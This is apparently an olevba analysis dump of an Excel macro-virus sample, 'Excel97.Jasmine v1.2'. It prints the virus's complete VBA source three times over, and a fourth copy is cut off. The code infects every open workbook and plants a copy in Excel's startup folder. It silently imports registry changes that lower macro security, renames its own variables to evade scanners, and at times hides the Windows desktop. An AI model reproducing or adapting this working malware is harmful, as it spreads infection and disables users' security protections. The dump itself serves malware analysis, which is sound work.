olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jasmine.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Jasmine.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Yp3Wi1Ex3Iq8Iw1, Xc4Rc6Nb1Xh7Uc3Yy9 As Boolean
'Jasmine
Private Sub WorkBook_Activate()
On Error Resume Next
Dim Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 As Object
Eq7Jw1 = "c:\remove.reg": Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then
  Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
  Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(1, _
   Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
  GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(j)
  Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
  Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
  If InStr(1, Wb9, "Sheet") Then
   If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
    Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
    GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
  End If
 Next
Next
Dj4Rb0Vn7Kv8Uz2Yx3Ym1:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Yp3Wi1Ex3Iq8Iw1 <> True Then
  Yp3Wi1Ex3Iq8Iw1 = True: Xc4Rc6Nb1Xh7Uc3Yy9 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) <> "'Jasmine" Then
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
   Set Infline = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Wb9, "Sheet") Then
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Xc4Rc6Nb1Xh7Uc3Yy9 = True Then
 Xc4Rc6Nb1Xh7Uc3Yy9 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Eq7Jw1 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Eq7Jw1, vbHide
 Kill Eq7Jw1
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Yx1Kg4De8Bs6Sm1Jd5Ca0 = Chr(65 + Int(Rnd * 26))
    j = Yx1Kg4De8Bs6Sm1Jd5Ca0 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Yx1Kg4De8Bs6Sm1Jd5Ca0 & ":" _
     & Yx1Kg4De8Bs6Sm1Jd5Ca0).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Do0Nw3Ag1Pz6Yk6 As Long: Dim Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 As Long: Dim Sa4Ym1Ho4Wi0 As Long: Dim Bp0Ah5Ak9Jr3Qa5Yo3Ze6 As Long
varray(1) = "Eq7Jw1": varray(2) = "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4": varray(3) = "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5": varray(4) = "Se3Hs8Xo2Ir2Rq4Kc9": varray(5) = "Wb9": varray(6) = "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9": varray(7) = "Yp3Wi1Ex3Iq8Iw1"
varray(8) = "Xc4Rc6Nb1Xh7Uc3Yy9": varray(9) = "Yx1Kg4De8Bs6Sm1Jd5Ca0": varray(10) = "Do0Nw3Ag1Pz6Yk6": varray(11) = "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1": varray(12) = "Sa4Ym1Ho4Wi0": varray(13) = "Bp0Ah5Ak9Jr3Qa5Yo3Ze6": varray(14) = "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Do0Nw3Ag1Pz6Yk6 = 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1: Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Do0Nw3Ag1Pz6Yk6, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1, Sa4Ym1Ho4Wi0, Bp0Ah5Ak9Jr3Qa5Yo3Ze6, True)
   strVal = .Lines(Do0Nw3Ag1Pz6Yk6, 1)
   strVal = Left(strVal, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 - 1) & PolyVal & Mid(strVal, Bp0Ah5Ak9Jr3Qa5Yo3Ze6)
   .ReplaceLine Do0Nw3Ag1Pz6Yk6, strVal
   Do0Nw3Ag1Pz6Yk6 = Sa4Ym1Ho4Wi0 + 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1
   Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Jasmine.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Yp3Wi1Ex3Iq8Iw1, Xc4Rc6Nb1Xh7Uc3Yy9 As Boolean
'Jasmine
Private Sub WorkBook_Activate()
On Error Resume Next
Dim Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 As Object
Eq7Jw1 = "c:\remove.reg": Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then
  Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
  Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(1, _
   Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
  GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(j)
  Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
  Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
  If InStr(1, Wb9, "Sheet") Then
   If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
    Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
    GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
  End If
 Next
Next
Dj4Rb0Vn7Kv8Uz2Yx3Ym1:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Yp3Wi1Ex3Iq8Iw1 <> True Then
  Yp3Wi1Ex3Iq8Iw1 = True: Xc4Rc6Nb1Xh7Uc3Yy9 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) <> "'Jasmine" Then
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
   Set Infline = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Wb9, "Sheet") Then
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Xc4Rc6Nb1Xh7Uc3Yy9 = True Then
 Xc4Rc6Nb1Xh7Uc3Yy9 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Eq7Jw1 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Eq7Jw1, vbHide
 Kill Eq7Jw1
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Yx1Kg4De8Bs6Sm1Jd5Ca0 = Chr(65 + Int(Rnd * 26))
    j = Yx1Kg4De8Bs6Sm1Jd5Ca0 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Yx1Kg4De8Bs6Sm1Jd5Ca0 & ":" _
     & Yx1Kg4De8Bs6Sm1Jd5Ca0).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Do0Nw3Ag1Pz6Yk6 As Long: Dim Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 As Long: Dim Sa4Ym1Ho4Wi0 As Long: Dim Bp0Ah5Ak9Jr3Qa5Yo3Ze6 As Long
varray(1) = "Eq7Jw1": varray(2) = "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4": varray(3) = "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5": varray(4) = "Se3Hs8Xo2Ir2Rq4Kc9": varray(5) = "Wb9": varray(6) = "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9": varray(7) = "Yp3Wi1Ex3Iq8Iw1"
varray(8) = "Xc4Rc6Nb1Xh7Uc3Yy9": varray(9) = "Yx1Kg4De8Bs6Sm1Jd5Ca0": varray(10) = "Do0Nw3Ag1Pz6Yk6": varray(11) = "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1": varray(12) = "Sa4Ym1Ho4Wi0": varray(13) = "Bp0Ah5Ak9Jr3Qa5Yo3Ze6": varray(14) = "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Do0Nw3Ag1Pz6Yk6 = 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1: Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Do0Nw3Ag1Pz6Yk6, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1, Sa4Ym1Ho4Wi0, Bp0Ah5Ak9Jr3Qa5Yo3Ze6, True)
   strVal = .Lines(Do0Nw3Ag1Pz6Yk6, 1)
   strVal = Left(strVal, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 - 1) & PolyVal & Mid(strVal, Bp0Ah5Ak9Jr3Qa5Yo3Ze6)
   .ReplaceLine Do0Nw3Ag1Pz6Yk6, strVal
   Do0Nw3Ag1Pz6Yk6 = Sa4Ym1Ho4Wi0 + 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1
   Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Jasmine.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Yp3Wi1Ex3Iq8Iw1, Xc4Rc6Nb1Xh7Uc3Yy9 As Boolean
'Jasmine
Private Sub WorkBook_Activate()
On Error Resume Next
Dim Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 As Object
Eq7Jw1 = "c:\remove.reg": Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then
  Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
  Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(1, _
   Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
  GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(j)
  Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
  Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
  If InStr(1, Wb9, "Sheet") Then
   If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4)
    Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.CountOfLines)
    GoTo Dj4Rb0Vn7Kv8Uz2Yx3Ym1
  End If
 Next
Next
Dj4Rb0Vn7Kv8Uz2Yx3Ym1:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Yp3Wi1Ex3Iq8Iw1 <> True Then
  Yp3Wi1Ex3Iq8Iw1 = True: Xc4Rc6Nb1Xh7Uc3Yy9 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) <> "'Jasmine" Then
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
  Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Se3Hs8Xo2Ir2Rq4Kc9 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Wb9 = Se3Hs8Xo2Ir2Rq4Kc9.Name
   Set Infline = Se3Hs8Xo2Ir2Rq4Kc9.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Wb9, "Sheet") Then
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.InsertLines 1, Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5
     Se3Hs8Xo2Ir2Rq4Kc9.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Xc4Rc6Nb1Xh7Uc3Yy9 = True Then
 Xc4Rc6Nb1Xh7Uc3Yy9 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Eq7Jw1 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Eq7Jw1, vbHide
 Kill Eq7Jw1
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Yx1Kg4De8Bs6Sm1Jd5Ca0 = Chr(65 + Int(Rnd * 26))
    j = Yx1Kg4De8Bs6Sm1Jd5Ca0 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Yx1Kg4De8Bs6Sm1Jd5Ca0 & ":" _
     & Yx1Kg4De8Bs6Sm1Jd5Ca0).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Do0Nw3Ag1Pz6Yk6 As Long: Dim Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 As Long: Dim Sa4Ym1Ho4Wi0 As Long: Dim Bp0Ah5Ak9Jr3Qa5Yo3Ze6 As Long
varray(1) = "Eq7Jw1": varray(2) = "Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4": varray(3) = "Rl0Pe9Ut6Ot3Mv9Vl4Th3Aj5": varray(4) = "Se3Hs8Xo2Ir2Rq4Kc9": varray(5) = "Wb9": varray(6) = "Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9": varray(7) = "Yp3Wi1Ex3Iq8Iw1"
varray(8) = "Xc4Rc6Nb1Xh7Uc3Yy9": varray(9) = "Yx1Kg4De8Bs6Sm1Jd5Ca0": varray(10) = "Do0Nw3Ag1Pz6Yk6": varray(11) = "Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1": varray(12) = "Sa4Ym1Ho4Wi0": varray(13) = "Bp0Ah5Ak9Jr3Qa5Yo3Ze6": varray(14) = "Dj4Rb0Vn7Kv8Uz2Yx3Ym1"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Do0Nw3Ag1Pz6Yk6 = 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1: Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Do0Nw3Ag1Pz6Yk6, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1, Sa4Ym1Ho4Wi0, Bp0Ah5Ak9Jr3Qa5Yo3Ze6, True)
   strVal = .Lines(Do0Nw3Ag1Pz6Yk6, 1)
   strVal = Left(strVal, Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 - 1) & PolyVal & Mid(strVal, Bp0Ah5Ak9Jr3Qa5Yo3Ze6)
   .ReplaceLine Do0Nw3Ag1Pz6Yk6, strVal
   Do0Nw3Ag1Pz6Yk6 = Sa4Ym1Ho4Wi0 + 1: Hm3Uj8Ho8Jx2Ma7Hw2Gg2Bv4Ma1 = 1
   Sa4Ym1Ho4Wi0 = .CountOfLines: Bp0Ah5Ak9Jr3Qa5Yo3Ze6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jasmine.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Yp3Wi1Ex3Iq8Iw1, Xc4Rc6Nb1Xh7Uc3Yy9 As Boolean
'Jasmine
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
Dim Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 As Object
Eq7Jw1 = "c:\remove.reg": Nu8Ni7Gv0Ov7Xy0Et9Nn7Mc9Pp4Pt9 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Yp6Kq8Nc9Un5Ib7Tb0Ee2Bg4.Lines(5, 1) = "'Jasmine" Then
